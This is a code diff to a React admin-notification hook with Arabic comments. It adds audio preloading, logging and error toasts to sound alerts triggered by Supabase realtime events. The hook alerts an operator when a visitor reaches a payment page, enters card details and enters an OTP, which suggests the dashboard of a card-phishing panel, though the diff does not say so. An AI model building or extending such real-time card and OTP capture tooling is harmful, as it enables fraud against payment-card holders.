@@ -20,18 +20,22 @@ export const useAdminNotifications = () => {
     // إنشاء عنصر الصوت للطلبات الجديدة
     audioRef.current = new Audio('/customer-info-notification.mp3');
     audioRef.current.volume = 0.7;
+    audioRef.current.preload = 'auto';
 
     // إنشاء عنصر الصوت لصفحة الدفع
     paymentAudioRef.current = new Audio('/payment-page-notification.mp3');
     paymentAudioRef.current.volume = 0.7;
+    paymentAudioRef.current.preload = 'auto';
 
     // إنشاء عنصر الصوت لإدخال بيانات البطاقة
     cardInfoAudioRef.current = new Audio('/card-info-notification.mp3');
     cardInfoAudioRef.current.volume = 0.7;
+    cardInfoAudioRef.current.preload = 'auto';
 
     // إنشاء عنصر الصوت لإدخال OTP
     otpAudioRef.current = new Audio('/otp-notification.mp3');
     otpAudioRef.current.volume = 0.7;
+    otpAudioRef.current.preload = 'auto';
 
     // الاستماع للطلبات الجديدة
     const ordersChannel = supabase
@@ -44,9 +48,10 @@ export const useAdminNotifications = () => {
           table: 'customer_orders'
         },
         (payload) => {
+          console.log('🔔 طلب جديد! تشغيل الصوت...', payload.new);
           playNotificationSound();
           toast.success('طلب جديد!', {
-            description: `تم استلام طلب جديد من ${payload.new.customer_name || 'عميل'}`,
+            description: `تم استلام طلب جديد من ${payload.new.owner_name || 'عميل'}`,
             duration: 5000,
           });
         }
@@ -218,9 +223,15 @@ export const useAdminNotifications = () => {
   const playNotificationSound = () => {
     if (audioRef.current) {
       audioRef.current.currentTime = 0;
-      audioRef.current.play().catch((error) => {
-        console.error('Error playing notification sound:', error);
-      });
+      console.log('🔊 محاولة تشغيل صوت معلومات العميل...');
+      audioRef.current.play()
+        .then(() => console.log('✅ تم تشغيل صوت معلومات العميل بنجاح'))
+        .catch((error) => {
+          console.error('❌ خطأ في تشغيل صوت معلومات العميل:', error);
+          toast.error('فشل تشغيل الصوت', {
+            description: 'يرجى النقر في أي مكان بالصفحة للسماح بتشغيل الأصوات',
+          });
+        });
     }
   };
 
